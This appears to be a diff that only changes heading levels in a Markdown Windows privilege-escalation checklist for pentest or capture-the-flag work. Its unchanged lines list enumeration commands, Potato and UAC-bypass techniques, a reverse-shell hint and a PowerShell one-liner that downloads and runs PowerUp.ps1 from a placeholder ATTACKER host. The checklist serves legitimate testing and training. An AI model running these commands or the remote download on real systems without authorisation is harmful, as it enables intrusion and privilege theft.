@@ -29,7 +29,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 0 — Orient (60 seconds)
+## Phase 0 — Orient (60 seconds)
 
 - [ ] `whoami /all` — user, groups, SID, **integrity level**
 - [ ] `whoami /priv` — **the single highest-value command**; an enabled `SeImpersonate`, `SeBackup`, or `SeDebug` is often an instant win[reference:1]
@@ -42,7 +42,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 1 — Automated Triage (run once, verify by hand)
+## Phase 1 — Automated Triage (run once, verify by hand)
 
 - [ ] `winPEASx64.exe quiet` — broad enumeration; focus on **red + yellow** findings
 - [ ] `powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"`[reference:2]
@@ -54,7 +54,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 2 — Token Privileges (highest payoff, 30 seconds)
+## Phase 2 — Token Privileges (highest payoff, 30 seconds)
 
 - [ ] `whoami /priv` — read the **entire** list, not just the first few
 - [ ] `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` → **Potato attack** (SigmaPotato, GodPotato, PrintSpoofer)
@@ -69,7 +69,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 3 — Service & Registry Misconfigurations
+## Phase 3 — Service & Registry Misconfigurations
 
 **Writable service binary (file-system ACL)**
 
@@ -108,7 +108,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 4 — Credentials (often the fastest lateral / root path)
+## Phase 4 — Credentials (often the fastest lateral / root path)
 
 **Files and histories**
 
@@ -151,7 +151,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 5 — Session, Process, and Token Attacks
+## Phase 5 — Session, Process, and Token Attacks
 
 - [ ] `whoami /groups | findstr "Mandatory"` — `Medium` + `Administrators` → **UAC bypass** (FODHelper, ICMLuaUtil COM)
 - [ ] **Saved credentials without password:** `runas /savecred` → launch a reverse shell without knowing the password
@@ -162,7 +162,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 6 — Scheduled Tasks and Startup
+## Phase 6 — Scheduled Tasks and Startup
 
 - [ ] `schtasks /query /fo LIST /v` — look for **writable Action binaries**
 - [ ] `Get-ScheduledTask | select TaskName,State`
@@ -173,7 +173,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 7 — UAC and Integrity Level
+## Phase 7 — UAC and Integrity Level
 
 - [ ] `whoami /groups` — `Medium Mandatory Level` + `Administrators` = UAC is the barrier
 - [ ] `REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin`
@@ -186,7 +186,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 8 — Kernel and Patch Level (last resort)
+## Phase 8 — Kernel and Patch Level (last resort)
 
 - [ ] `systeminfo` → `wesng` / `Watson` / `windows-exploit-suggester`
 - [ ] `wmic qfe` (pre-24H2) or `Get-HotFix`
@@ -197,7 +197,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Phase 9 — Domain and AD CS (if domain-joined)
+## Phase 9 — Domain and AD CS (if domain-joined)
 
 - [ ] `certipy find -u user@domain -p 'Pass' -dc-ip DC_IP -vulnerable` — **ESC1–ESC17**
 - [ ] `Get-ADComputer -Filter {TrustedForDelegation -eq $true}` — unconstrained delegation
@@ -209,7 +209,7 @@ tags = ['windows', 'privilege-escalation', 'checklist']
 
 ---
 
-### Stop Conditions
+## Stop Conditions
 
 - [ ] SYSTEM / Administrator obtained → **stop enumerating, record the path, screenshot / copy flags**
 - [ ] Two full passes with no lead → re-read `whoami /priv`, service DACLs, `cmdkey /list`, **process environments**, and **scheduled-task Action binaries** — these are the most-missed
